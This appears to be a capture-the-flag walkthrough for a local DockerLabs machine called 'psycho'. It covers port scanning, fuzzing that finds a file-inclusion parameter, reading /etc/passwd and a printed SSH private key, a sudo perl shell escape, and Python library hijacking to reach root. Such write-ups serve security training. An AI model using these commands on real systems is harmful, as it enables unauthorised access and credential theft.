## init
```bash
# machine form dockerlabs
unzip psycho.zip
chmod +x auto_deploy.sh
./auto_deploy.sh psycho.tar

# 172.17.0.2 - IP machine
<>
ping -c 1 172.17.0.2
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted

whatweb http://172.17.0.2
dirb http://172.17.0.2 /usr/share/wordlists/dirb/common.
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

ffuf -c -t 200 -fc 404 -fs 2596 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd"
# ans
secret                  [Status: 200, Size: 3870, Words: 678, Lines: 89, Duration: 3ms]

curl "http://172.17.0.2/index.php?secret=/etc/passwd" | grep "/sh"
# ans
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
luisillo:x:1002:1002::/home/luisillo:/bin/sh

http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
# ans
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA
UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2
EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA
QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH
EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS
HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf
6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy
hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D
gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd
ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX
5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4
4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G
+bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu
7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd
2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh
oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ
ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA
wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP
kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx
gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6
G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM
ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu
bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o
t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6
lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad
bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2
1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ
aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo
1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA==
-----END OPENSSH PRIVATE KEY-----

# Sve this ppk in id_rsa file
chmod 600 id_rsa
ssh vaxei@172.17.0.2 -i id_rsa | ssh -i id_rsa vaxei@172.17.0.2

export TERM=xterm
export SHEL=bash
export TERM=xterm-256color
source /etc/skel/.bashrc

sudo -l
# ans
Matching Defaults entries for vaxei on 72806f19b5bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on 72806f19b5bf:
    (luisillo) NOPASSWD: /usr/bin/perl

sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";' # sudo -u luisillo from this (luisillo) NOPASSWD: /usr/bin/perl

sudo -l
# ans
Matching Defaults entries for luisillo on 72806f19b5bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 72806f19b5bf:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py

python3 -c "import sys; print(sys.path)"

['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dis'] # it pass firts for the current dir

# Theft of libraries
nano subprocess.py

# into file
import os
os.system("bash -p")

sudo -u root /usr/bin/python3 /opt/paw.py  # sudo -l root from this (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py

id
cd /root



```